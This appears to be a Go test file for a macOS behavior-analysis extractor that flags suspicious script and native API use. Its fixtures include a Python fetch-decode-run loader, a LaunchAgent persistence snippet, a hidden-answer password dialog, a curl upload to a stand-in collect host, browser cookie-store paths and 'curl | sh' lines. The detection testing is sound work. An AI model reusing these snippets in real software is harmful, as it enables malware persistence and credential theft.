	var trustedJXA behavior.Graph
	ExtractText(&trustedJXA, content)
	assertShellCommandNetwork(t, trustedJXA, "https://jxa-cmd.example/payload")
	if countRelationKind(trustedJXA.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("trusted JXA doShellScript should produce one pipes-to relation: %#v", trustedJXA.Relations)
	}
}

func TestExtractTextUsesTrustedHostForExtensionlessShell(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:           "node-0001",
		LogicalPath:      "launchAgentInstaller",
		Kind:             "text",
		MediaType:        "text/plain",
		SemanticLanguage: "shell",
		Data: []byte(`DOMAIN="example.invalid"
cat << EOL > ~/Library/LaunchAgents/$DOMAIN.plist
payload
EOL
launchctl load ~/Library/LaunchAgents/$DOMAIN.plist
`),
	}

	ExtractText(&graph, content)

	for _, operation := range graph.Operations {
		if operation.Kind == "launchd.job.install" {
			return
		}
	}
	t.Fatalf("extensionless shell script should produce launch persistence operation: %#v", graph.Operations)
}

func TestExtractTextDoesNotInferOneLanguageForStructuredYAML(t *testing.T) {
	for _, logicalPath := range []string{
		".github/workflows/release.yml",
		".github/workflows/release.yaml",
	} {
		t.Run(filepath.Ext(logicalPath), func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{
				NodeID:                 "node-workflow",
				LogicalPath:            logicalPath,
				Kind:                   "text",
				MediaType:              "text/plain",
				Role:                   "target",
				BehaviorAnalysisForced: true,
				Data: []byte(`name: release
on: push
jobs:
  inspect:
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            // Get repository name
            // curl https://comment.invalid/payload
      - run: |
          curl https://shell.invalid/payload
`),
			}

			if got := contentLanguage(content); got != "yaml" {
				t.Fatalf("contentLanguage(%q) = %q, want yaml", logicalPath, got)
			}
			ExtractText(&graph, content)

			if len(graph.Operations) != 0 || len(graph.Network) != 0 || len(graph.Features) != 0 {
				t.Fatalf("structured YAML produced executable semantics: operations=%#v network=%#v features=%#v", graph.Operations, graph.Network, graph.Features)
			}
			if !hasCoverageArea(graph, content.NodeID, "structured-yaml-semantics", "partial") {
				t.Fatalf("structured YAML lacks explicit partial coverage: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextDoesNotInferShellForKnownUnsupportedLanguages(t *testing.T) {
	tests := []struct {
		logicalPath  string
		analysisArea string
		data         string
	}{
		{
			logicalPath:  "MavenWrapperDownloader.java",
			analysisArea: "java-source-semantics",
			data: `/*
curl https://comment.invalid/payload
*/
public final class MavenWrapperDownloader {}
`,
		},
		{
			logicalPath:  "mvnw.cmd",
			analysisArea: "windows-command-semantics",
			data: `@REM Download the wrapper
"$webclient = new-object System.Net.WebClient;"^
`,
		},
	}

	for _, test := range tests {
		t.Run(test.logicalPath, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{
				NodeID:                 "node-source",
				LogicalPath:            test.logicalPath,
				Kind:                   "text",
				MediaType:              "text/plain",
				Role:                   "target",
				BehaviorAnalysisForced: true,
				Data:                   []byte(test.data),
			}

			ExtractText(&graph, content)

			if len(graph.Operations) != 0 || len(graph.Network) != 0 || len(graph.Features) != 0 {
				t.Fatalf("known unsupported language produced executable semantics: operations=%#v network=%#v features=%#v", graph.Operations, graph.Network, graph.Features)
			}
			if !hasCoverageArea(graph, content.NodeID, test.analysisArea, "partial") {
				t.Fatalf("known unsupported language lacks explicit partial coverage: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextDoesNotPromotePHPToShell(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "gallery.php",
		Kind:        "script",
		MediaType:   "text/plain",
		Role:        "unknown",
		Executable:  true,
		Data: []byte(`<?php
if ($enabled) {
    echo "cat";
}
echo shell_exec($command);
?>`),
	}

	ExtractText(&graph, content)

	if len(graph.Operations) != 0 || len(graph.Network) != 0 {
		t.Fatalf("unsupported PHP syntax was misclassified as shell: operations=%#v network=%#v", graph.Operations, graph.Network)
	}
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea == "text-semantics" && coverage.Status == "skipped" {
			return
		}
	}
	t.Fatalf("unsupported PHP semantics lack explicit coverage: %#v", graph.Coverage)
}

func TestExtractTextUsesTrustedHostForExtensionlessPython(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:           "node-0001",
		LogicalPath:      "RN Loader",
		Kind:             "text",
		MediaType:        "text/plain",
		SemanticLanguage: "python",
		Role:             "unknown",
		Data: []byte(`import base64
import os
import requests
import subprocess

def fetch_payload(url):
    response = requests.get(url)
    target = os.path.join("/tmp", "dockerd")
    with open(target, "wb") as handle:
        handle.write(base64.b64decode(response.content))
    subprocess.Popen([target])
`),
	}

	ExtractText(&graph, content)

	if len(graph.Operations) == 0 || len(graph.Network) == 0 {
		t.Fatalf("extensionless Python should receive semantic analysis: operations=%#v network=%#v", graph.Operations, graph.Network)
	}
}

func TestExtractTextUsesTrustedHostForExtensionlessAppleScript(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:           "node-0001",
		LogicalPath:      "zoom-sdk-support-applescript-deadbeef",
		Kind:             "text",
		MediaType:        "text/plain",
		SemanticLanguage: "applescript",
		Role:             "unknown",
		Data: []byte(`-- SDK update
set zoomSDKURL to "https://developers.example/sdk/"
do shell script "open -g " & quoted form of zoomSDKURL
`),
	}

	ExtractText(&graph, content)

	if len(graph.Operations) == 0 {
		t.Fatalf("extensionless AppleScript should receive semantic analysis: %#v", graph)
	}
	for _, coverage := range graph.Coverage {
		if coverage.AnalysisArea == "text-semantics" && coverage.Status == "skipped" {
			t.Fatalf("recognized AppleScript was marked unsupported: %#v", graph.Coverage)
		}
	}
}

func TestAppleScriptCredentialPromptRequiresHiddenAnswer(t *testing.T) {
	for _, test := range []struct {
		name string
		line string
		want bool
	}{
		{name: "ordinary dialog", line: `display dialog "Continue?" default answer "yes"`, want: false},
		{name: "hidden answer", line: `display dialog "Password:" default answer "" with hidden answer`, want: true},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: "prompt.applescript",
				Kind:        "script",
				MediaType:   "text/plain",
				Role:        "target",
				Data:        []byte(test.line),
			})
			got := false
			for _, operation := range graph.Operations {
				got = got || operation.Kind == behavior.OperationCredentialPrompt
			}
			if got != test.want {
				t.Fatalf("credential prompt = %v, want %v; operations=%#v", got, test.want, graph.Operations)
			}
		})
	}
}

func TestExtractTextRecordsUnsupportedSemanticLanguage(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "extensionless-payload",
		Kind:        "text",
		MediaType:   "text/plain",
		Role:        "unknown",
		Data:        []byte("opaque text that has no supported language grammar"),
	})
	if len(graph.Coverage) != 1 || graph.Coverage[0].AnalysisArea != "text-semantics" || graph.Coverage[0].Status != "skipped" {
		t.Fatalf("unsupported semantic coverage = %#v", graph.Coverage)
	}
}

func TestBrowserCredentialDefinitionFeatureIsBoundedAndSpecific(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "collector.js", Kind: "script", Role: "target"}
	content.Data = []byte(`const stores = readFile("Google/Chrome Cookies Login Data");`)
	ExtractText(&graph, content)
	for _, feature := range graph.Features {
		if feature.Key == "script.browser_credential_store" {
			if feature.Value != "browser credential-store definition" {
				t.Fatalf("browser definition feature retained source text: %#v", feature)
			}
			return
		}
	}
	t.Fatalf("missing compact browser credential definition feature: %#v", graph.Features)
}

func TestBrowserCredentialDefinitionRejectsMinifiedBlob(t *testing.T) {
	line := `const page="Google/Chrome Cookies Login Data";` + strings.Repeat("x", 4096)
	if browserCredentialDefinition(line) {
		t.Fatal("oversized minified line was classified as a credential-store definition")
	}
}

func TestBrowserCredentialDefinitionTrackerCorrelatesBoundedSameFunctionLines(t *testing.T) {
	var tracker browserCredentialDefinitionTracker
	if _, ok := tracker.Observe("jxa", `profilesPath: "~/Library/Application Support/Google/Chrome/",`, 10, "collect"); ok {
		t.Fatal("browser profile line alone became a credential-store definition")
	}
	got, ok := tracker.Observe("jxa", `extractFiles: ["Cookies", "Login Data"]`, 12, "collect")
	if !ok || got.familyLine != 10 || got.credentialLine != 12 || got.function != "collect" {
		t.Fatalf("bounded multiline browser definition = %#v, ok=%v", got, ok)
	}
}

func TestBrowserCredentialDefinitionTrackerRejectsDistantCrossFunctionAndMinifiedCorrelation(t *testing.T) {
	tests := []struct {
		name       string
		secondLine int
		secondFunc string
	}{
		{name: "distant", secondLine: 20, secondFunc: "collect"},
		{name: "different function", secondLine: 11, secondFunc: "other"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var tracker browserCredentialDefinitionTracker
			tracker.Observe("javascript", `profilesPath: "Google/Chrome"`, 1, "collect")
			if got, ok := tracker.Observe("javascript", `extractFiles: ["Cookies"]`, tt.secondLine, tt.secondFunc); ok {
				t.Fatalf("unsafe cross-context definition = %#v", got)
			}
		})
	}

	var tracker browserCredentialDefinitionTracker
	tracker.Observe("javascript", `profilesPath: "Google/Chrome"`, 1, "collect")
	tracker.Observe("javascript", strings.Repeat("x", 2049), 2, "collect")
	if got, ok := tracker.Observe("javascript", `extractFiles: ["Cookies"]`, 3, "collect"); ok {
		t.Fatalf("candidate crossed an oversized minified line: %#v", got)
	}

	tracker = browserCredentialDefinitionTracker{}
	tracker.Observe("javascript", `profilesPath: "Google/Chrome"`, 1, "collect")
	tracker.Observe("javascript", `};`, 2, "collect")
	if got, ok := tracker.Observe("javascript", `extractFiles: ["Cookies"]`, 3, "collect"); ok {
		t.Fatalf("candidate crossed a closed object definition: %#v", got)
	}
}

func TestExtractTextIgnoresInlineComments(t *testing.T) {
	tests := []struct {
		name string
		path string
		data string
	}{
		{
			name: "shell",
			path: "script.sh",
			data: `echo ok # curl https://comment.example/payload | sh`,
		},
		{
			name: "python",
			path: "script.py",
			data: `print("ok") # requests.get("https://comment.example/payload")`,
		},
		{
			name: "javascript",
			path: "script.js",
			data: `const ok = true; // fetch("https://comment.example/payload")`,
		},
		{
			name: "native source",
			path: "Keychain.swift",
			data: `// SecItemCopyMatching(query as CFDictionary, nil)`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: tt.path,
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(tt.data),
			}

			ExtractText(&graph, content)

			if len(graph.Network) != 0 || len(graph.Operations) != 0 || hasOperationFlowRelation(graph.Relations) {
				t.Fatalf("inline comment should not produce behavior: network=%#v operations=%#v relations=%#v", graph.Network, graph.Operations, graph.Relations)
			}
		})
	}
}

func TestExtractTextNativeClipboardReadRequiresConcreteRead(t *testing.T) {
	tests := []struct {
		name string
		path string
		data string
		want bool
	}{
		{
			name: "Swift general pasteboard string read",
			path: "Clipboard.swift",
			data: `let value = NSPasteboard.general.string(forType: .string)`,
			want: true,
		},
		{
			name: "Objective-C general pasteboard string read",
			path: "Clipboard.m",
			data: `NSString *value = [[NSPasteboard generalPasteboard] stringForType:NSPasteboardTypeString];`,
			want: true,
		},
		{
			name: "JXA general pasteboard string read",
			path: "Clipboard.jxa",
			data: `const value = $.NSPasteboard.generalPasteboard.stringForType($.NSPasteboardTypeString);`,
			want: true,
		},
		{
			name: "Carbon pasteboard flavor read",
			path: "Clipboard.c",
			data: `PasteboardCopyItemFlavorData(pasteboard, itemID, flavor, &data);`,
		},
		{
			name: "pasteboard type declaration",
			path: "DragDrop.swift",
			data: `static let pasteboardType = NSPasteboard.PasteboardType("com.example.history-node-id")`,
		},
		{
			name: "drag and drop writer",
			path: "DragDrop.swift",
			data: `func outlineView(_ outlineView: NSOutlineView, pasteboardWriterForItem item: Any) -> NSPasteboardWriting? {`,
		},
		{
			name: "pasteboard item allocation",
			path: "DragDrop.swift",
			data: `let pasteboardItem = NSPasteboardItem()`,
		},
		{
			name: "pasteboard availability check",
			path: "Clipboard.swift",
			data: `if NSPasteboard.general.canReadObject(forClasses: [NSString.self]) { return }`,
		},
		{
			name: "pasteboard handle only",
			path: "Clipboard.swift",
			data: `let pasteboard = NSPasteboard.general`,
		},
		{
			name: "native source quoted API prose",
			path: "Clipboard.m",
			data: `NSString *note = @"NSPasteboard.general.string(forType: .string)";`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: tt.path,
				Kind:        "text",
				MediaType:   "text/plain",
				Role:        "runtime",
				Data:        []byte(tt.data),
			})

			var got bool
			for _, operation := range graph.Operations {
				if operation.Kind == behavior.OperationClipboardRead {
					got = true
				}
			}
			if got != tt.want {
				t.Fatalf("clipboard read operation = %t, want %t: %#v", got, tt.want, graph.Operations)
			}
		})
	}
}

func TestExtractTextNativeClipboardWriteRequiresConcreteWrite(t *testing.T) {
	tests := []struct {
		name string
		path string
		data string
		want bool
	}{
		{"Swift pasteboard write", "Clipboard.swift", `NSPasteboard.general.setString(value, forType: .string)`, true},
		{"Objective-C pasteboard write", "Clipboard.m", `[[NSPasteboard generalPasteboard] setString:value forType:NSPasteboardTypeString];`, true},
		{"Carbon pasteboard write", "Clipboard.c", `PasteboardPutItemFlavor(pasteboard, itemID, flavor, data, 0);`, false},
		{"method collision without class", "Model.swift", `model.setString(value, forType: .string)`, false},
		{"quoted API prose", "Clipboard.m", `NSString *note = @"NSPasteboard.general.setString(value, forType: .string)";`, false},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{NodeID: "node-1", LogicalPath: test.path, Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(test.data)})
			got := false
			for _, operation := range graph.Operations {
				got = got || operation.Kind == behavior.OperationClipboardWrite
			}
			if got != test.want {
				t.Fatalf("clipboard write = %t, want %t: %#v", got, test.want, graph.Operations)
			}
		})
	}
}

func TestExtractTextCarbonPasteboardIOStaysDistinctFromClipboard(t *testing.T) {
	for _, test := range []struct {
		line string
		kind behavior.OperationKind
	}{
		{`PasteboardCopyItemFlavorData(pasteboard, itemID, flavor, &data);`, behavior.OperationPasteboardItemRead},
		{`PasteboardPutItemFlavor(pasteboard, itemID, flavor, data, 0);`, behavior.OperationPasteboardItemWrite},
	} {
		var graph behavior.Graph
		ExtractText(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "Pasteboard.c", Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(test.line)})
		found := false
		for _, operation := range graph.Operations {
			if operation.Kind == behavior.OperationClipboardRead || operation.Kind == behavior.OperationClipboardWrite {
				t.Fatalf("unresolved Carbon PasteboardRef became general clipboard access: %#v", graph.Operations)
			}
			found = found || operation.Kind == test.kind && operation.RequiredResource().Kind == behavior.ResourcePasteboard
		}
		if !found {
			t.Fatalf("generic pasteboard operation was lost: %#v", graph.Operations)
		}
	}
}

func TestExtractTextNativeInputAndAudioCallsAreExact(t *testing.T) {
	tests := []struct {
		name string
		line string
		kind behavior.OperationKind
	}{
		{"event tap", `let tap = CGEventTapCreate(.cgSessionEventTap, .headInsertEventTap, .listenOnly, mask, callback, nil)`, behavior.OperationInputEventTapCreate},
		{"audio queue", `AudioQueueNewInput(&format, callback, context, nil, nil, 0, &queue);`, behavior.OperationAudioRecordingQueueCreate},
		{"Swift camera", `AVCapturePhotoOutput().capturePhoto(with: settings, delegate: delegate)`, behavior.OperationCameraCapture},
		{"Objective-C camera", `[(AVCapturePhotoOutput *)output capturePhotoWithSettings:settings delegate:delegate];`, behavior.OperationCameraCapture},
		{"screen capture", `CGWindowListCreateImage(CGRectNull, kCGWindowListOptionAll, kCGNullWindowID, kCGWindowImageDefault);`, behavior.OperationScreenCapture},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "BenignControl.swift", Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(test.line)})
			found := false
			for _, operation := range graph.Operations {
				found = found || operation.Kind == test.kind && operation.Support == behavior.SupportCorroborated
			}
			if !found {
				t.Fatalf("missing exact native operation %s: %#v", test.kind, graph.Operations)
			}

			var negative behavior.Graph
			ExtractText(&negative, artifact.Content{NodeID: "node-2", LogicalPath: "BenignControl.swift", Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(`let prose = "` + test.line + `"`)})
			for _, operation := range negative.Operations {
				if operation.Kind == test.kind {
					t.Fatalf("quoted call became %s: %#v", test.kind, negative.Operations)
				}
			}
		})
	}
	var unresolvedReceiver behavior.Graph
	ExtractText(&unresolvedReceiver, artifact.Content{NodeID: "node-3", LogicalPath: "Control.swift", Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(`photoOutput.capturePhoto(with: settings, delegate: delegate)`)})
	for _, operation := range unresolvedReceiver.Operations {
		if operation.Kind == behavior.OperationCameraCapture {
			t.Fatalf("unresolved source receiver became camera capture: %#v", unresolvedReceiver.Operations)
		}
	}
	var unrelatedClass behavior.Graph
	ExtractText(&unrelatedClass, artifact.Content{NodeID: "node-4", LogicalPath: "Control.swift", Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(`let marker = AVCapturePhotoOutput.self; photoOutput.capturePhoto(with: settings, delegate: delegate)`)})
	for _, operation := range unrelatedClass.Operations {
		if operation.Kind == behavior.OperationCameraCapture {
			t.Fatalf("unrelated camera class token established receiver identity: %#v", unrelatedClass.Operations)
		}
	}
	var caseLookalike behavior.Graph
	ExtractText(&caseLookalike, artifact.Content{NodeID: "node-5", LogicalPath: "Control.swift", Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(`cgwindowlistcreateimage(rect, options, window, imageOptions)`)})
	for _, operation := range caseLookalike.Operations {
		if operation.Kind == behavior.OperationScreenCapture {
			t.Fatalf("case-insensitive API lookalike became screen capture: %#v", caseLookalike.Operations)
		}
	}
}

func TestNativeProcessPrimitivesRequireUnquotedCalls(t *testing.T) {
	for _, primitive := range []string{"task_for_pid", "mach_vm_read", "mach_vm_write", "thread_create_running"} {
		if got := processPrimitiveOperationKindsInText(primitive + `(task, value);`); len(got) != 1 {
			t.Fatalf("exact %s call = %#v", primitive, got)
		}
		for _, line := range []string{
			`const char *name = "` + primitive + `";`,
			primitive + ` = replacement;`,
			`document_` + primitive + `(value);`,
			`object.` + primitive + `(value);`,
		} {
			if got := processPrimitiveOperationKindsInText(line); len(got) != 0 {
				t.Fatalf("non-call %q became process primitive: %#v", line, got)
			}
		}
	}
}

func TestExtractTextNativeWorkspaceProcessEnumerationRequiresConcreteClass(t *testing.T) {
	tests := []struct {
		name string
		path string
		line string
		want bool
	}{
		{"Swift running applications", "ProcessList.swift", `let apps = NSWorkspace.shared.runningApplications`, true},
		{"Objective-C launched applications", "ProcessList.m", `NSArray *apps = [[NSWorkspace sharedWorkspace] launchedApplications];`, true},
		{"unresolved receiver", "ProcessList.swift", `let apps = workspace.runningApplications`, false},
		{"unrelated class token", "ProcessList.swift", `let marker = NSWorkspace.self; let apps = workspace.runningApplications`, false},
		{"near member", "ProcessList.swift", `let apps = NSWorkspace.shared.frontmostApplication`, false},
		{"quoted prose", "ProcessList.m", `NSString *note = @"NSWorkspace.shared.runningApplications";`, false},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{NodeID: "node-1", LogicalPath: test.path, Kind: "text", MediaType: "text/plain", Role: "runtime", Data: []byte(test.line)})
			got := false
			for _, operation := range graph.Operations {
				got = got || operation.Kind == behavior.OperationProcessEnumerate && operation.Support == behavior.SupportCorroborated
			}
			if got != test.want {
				t.Fatalf("process enumeration = %t, want %t: %#v", got, test.want, graph.Operations)
			}
		})
	}
}

func TestExtractTextDoesNotInferGoSourceCommentsAsShellCommands(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "chrome_cookie_darwin.go",
		Kind:        "text",
		MediaType:   "text/plain",
		Role:        "unknown",
		Data: []byte(`//go:build darwin
package collector

// get user data directory path string
//Open the cookie database
/*
 * curl https://comment.example/payload | sh
 */
/*
fetch("https://comment-body.example/payload")
func commentedOut() {
}
*/
func collect() {
	for _, profile := range profiles {
		result = append(result, profile)
	}
}`),
	}

	if got := contentLanguage(content); got != "native-source" {
		t.Fatalf("contentLanguage(.go) = %q, want native-source", got)
	}
	ExtractText(&graph, content)

	if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("Go comments should not produce behavior: operations=%#v network=%#v relations=%#v", graph.Operations, graph.Network, graph.Relations)
	}
	foundCoverage := false
	for _, coverage := range graph.Coverage {
		if coverage.NodeID == "" && coverage.AnalysisArea == "native-source-semantics/go" && coverage.Status == "partial" {
			foundCoverage = true
		}
	}
	if !foundCoverage {
		t.Fatalf("Go source semantic limitation was not disclosed: %#v", graph.Coverage)
	}
}

func TestContentLanguageUsesSharedExactShebangParser(t *testing.T) {
	tests := []struct {
		name string
		data string
		want string
	}{
		{name: "env split python", data: "#!/usr/bin/env -S python3 -O\nprint('inert')\n", want: "python"},
		{name: "jxa", data: "#!/usr/bin/osascript -l JavaScript\nObjC.import('Foundation')\n", want: "jxa"},
		{name: "wish", data: "#!/usr/bin/wish\nputs inert\n", want: ""},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			content := artifact.Content{LogicalPath: "extensionless", Kind: "text", Data: []byte(test.data)}
			if got := contentLanguage(content); got != test.want {
				t.Fatalf("contentLanguage() = %q, want %q", got, test.want)
			}
		})
	}
}

func TestExecutableModeDoesNotInventShellHostSemantics(t *testing.T) {
	for _, test := range []struct {
		name string
		data string
	}{
		{name: "no shebang", data: "plain executable text with no declared host\n"},
		{name: "shell-like body without shebang", data: "DOMAIN=example.invalid\ncurl https://inert.example/payload\n"},
		{name: "python-like body without shebang", data: "import requests\nimport subprocess\ndef run():\n    subprocess.Popen(['/tmp/inert'])\n"},
		{name: "applescript-like body without shebang", data: "set targetURL to \"https://inert.example\"\ndo shell script \"open \" & targetURL\n"},
		{name: "unsupported shebang", data: "#!/usr/bin/ruby\nsystem('curl https://inert.example/payload')\n"},
		{name: "malformed shebang", data: "#!/tmp/sh\ncurl https://inert.example/payload\n"},
		{name: "leading-space pseudo shebang", data: " #!/bin/sh\ncurl https://inert.example/payload\n"},
		{name: "bom pseudo shebang", data: "\ufeff#!/bin/sh\ncurl https://inert.example/payload\n"},
	} {
		t.Run(test.name, func(t *testing.T) {
			content := artifact.Content{
				NodeID: "node-0001", LogicalPath: "extensionless", Kind: "script",
				MediaType: "text/plain", Role: "unknown", Executable: true, Data: []byte(test.data),
			}
			if got := contentLanguage(content); got != "" {
				t.Fatalf("executable mode inferred language %q", got)
			}
			var graph behavior.Graph
			ExtractText(&graph, content)
			if len(graph.Operations) != 0 || len(graph.Network) != 0 {
				t.Fatalf("unresolved host produced semantics: operations=%#v network=%#v", graph.Operations, graph.Network)
			}
			if !hasCoverageArea(graph, content.NodeID, "text-semantics", "skipped") {
				t.Fatalf("unresolved executable host lacks explicit coverage: %#v", graph.Coverage)
			}
		})
	}
	content := artifact.Content{LogicalPath: "misleading.sh", Kind: "script", Executable: true, Data: []byte("#!/usr/bin/ruby\nputs 'inert'\n")}
	if got := contentLanguage(content); got != "" {
		t.Fatalf("filename extension overrode unsupported explicit host with %q", got)
	}
}

func TestExtractTextRustLifetimeDoesNotProtectInlineComment(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "sample.rs",
		Kind:        "text",
		MediaType:   "text/plain",
		Role:        "runtime",
		Data: []byte(`fn harmless(value: &'static str) {
    let copy = value; // SecItemCopyMatching(query)
}`),
	})

	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationCredentialStoreRead || operation.Kind == behavior.OperationKeychainItemQuery {
			t.Fatalf("API name in a Rust lifetime line comment became behavior: %#v", graph.Operations)
		}
	}
}

func TestExtractTextNativeCharLiteralPreservesCodeBeforeComment(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "sample.rs",
		Kind:        "text",
		MediaType:   "text/plain",
		Role:        "runtime",
		Data: []byte(`fn inspect() {
    let slash = '/'; SecItemCopyMatching(query); // harmless explanation
}`),
	})

	var queries int
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationKeychainItemQuery {
			queries++
			if operation.Support != behavior.SupportHeuristic {
				t.Fatalf("Rust source API spelling must remain heuristic: %#v", operation)
			}
		}
	}
	if queries != 1 {
		t.Fatalf("native char literal hid code before an inline comment: %#v", graph.Operations)
	}
}

func TestExtractTextDoesNotTreatGoStringDataAsScriptResource(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "chrome_change_pref.go",
		Kind:        "text",
		MediaType:   "text/plain",
		Role:        "unknown",
		Data: []byte("package collector\n\n" +
			"func preferences() string {\n" +
			"\treturn `" + strings.Repeat("x", 1024) + ` https://*.cx.metamask.io/*` + "`\n" +
			"}\n"),
	}

	ExtractText(&graph, content)

	for _, feature := range graph.Features {
		if feature.Key == "script.sensitive_resource" {
			t.Fatalf("Go string data produced a script resource feature: %#v", feature)
		}
	}
}

func TestExtractTextRetainsAssignedStaticURLsWithoutInventingNetworkOperation(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "macpatch.sh",
		Kind:        "script",
		MediaType:   "text/plain",
		Role:        "runtime",
		Data: []byte(
			`ZIP_URL_ARM64="https://downloads.example/drv-Arm64.patch"` + "\n" +
				`ZIP_URL_INTEL="https://downloads.example/drv-Intel.patch"` + "\n",
		),
	}

	ExtractText(&graph, content)

	if len(graph.Operations) != 0 {
		t.Fatalf("URL assignments invented runtime operations: %#v", graph.Operations)
	}
	want := map[string]bool{
		"https://downloads.example/drv-Arm64.patch": false,
		"https://downloads.example/drv-Intel.patch": false,
	}
	for _, feature := range graph.Features {
		if feature.Key == "network.url" {
			if _, ok := want[feature.Value]; ok {
				want[feature.Value] = feature.Support == behavior.SupportCorroborated && feature.Qualifiers["context"] == "static-assignment"
			}
		}
	}
	for value, found := range want {
		if !found {
			t.Fatalf("missing supported static URL feature %q: %#v", value, graph.Features)
		}
	}
	if len(graph.Network) != 0 {
		t.Fatalf("uninvoked URL assignments must not become implementation observations: %#v", graph.Network)
	}
}

func TestExtractTextLeavesConstructedAppleScriptMultipartArgumentsUnknown(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "upload.applescript",
		Kind:        "script",
		MediaType:   "text/plain",
		Role:        "runtime",
		Data: []byte(
			`do shell script "curl " & uploadFlags & " -F 'file=@" & zipPath & "' -F 'user=" & userName & "' " & "https://upload.example/collect"`,
		),
	}

	ExtractText(&graph, content)

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationInterpreterInvoke {
		t.Fatalf("unresolved expression must retain only the shell invocation: %#v", graph.Operations)
	}
	if arguments, ok := testOperationBinding(graph.Operations[0], behavior.ResourceRoleArguments); !ok || arguments.Value != "" {
		t.Fatalf("literal fragments must not become a complete command: %#v", graph.Operations)
	}
	if len(graph.Network) != 0 {
		t.Fatalf("unresolved expression invented a network implementation: %#v", graph.Network)
	}
}

func TestExtractTextDoesNotTreatConstructedCurlFormStringAsFileUpload(t *testing.T) {
	var graph behavior.Graph
	ExtractText(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "dialog.applescript",
		Kind:        "script",
		MediaType:   "text/plain",
		Role:        "runtime",
		Data: []byte(
			`do shell script "curl --form-string 'file=@" & displayedValue & "' " & "https://upload.example/collect"`,
		),
	})

	for _, operation := range graph.Operations {
		if operation.Kind == "network.upload" {
			t.Fatalf("curl --form-string sends literal text and must not become a file upload: %#v", graph.Operations)
		}
	}
}

func TestExtractTextKeepsCommentMarkersInsideStrings(t *testing.T) {
	tests := []struct {
		name string
		path string
		data string
		want string
	}{
		{
			name: "python fragment",
			path: "client.py",
			data: "import requests\n" + `requests.get("https://real.example/path#fragment") # requests.get("https://comment.example")`,
			want: "https://real.example/path#fragment",
		},
		{
			name: "javascript slashes",
			path: "client.js",
			data: `fetch("https://real-js.example/a//b"); // fetch("https://comment.example")`,
			want: "https://real-js.example/a//b",
		},
		{
			name: "native source",
			path: "Keychain.swift",
			data: `SecItemCopyMatching(query as CFDictionary, nil) // keychain access`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{
				NodeID:      "node-0001",
				LogicalPath: tt.path,
				Kind:        "script",
				MediaType:   "text/plain",
				Data:        []byte(tt.data),
			}

			ExtractText(&graph, content)

			if tt.want != "" {
				assertShellCommandNetwork(t, graph, tt.want)
				assertNetworkDestinationAbsent(t, graph, "https://comment.example")
				return
			}
			assertOperationKind(t, graph, behavior.OperationKeychainItemQuery)
		})
	}
}

func TestExtractTextNativeServiceManagementCalls(t *testing.T) {
	tests := []struct {
		line     string
		kind     string
		category string
		concrete string
	}{
		{`SMLoginItemSetEnabled("com.example.helper" as CFString, true)`, "login-item.enable", "login-item", "com.example.helper"},
		{`SMLoginItemSetEnabled ("com.example.spaced" as CFString, true)`, "login-item.enable", "login-item", "com.example.spaced"},
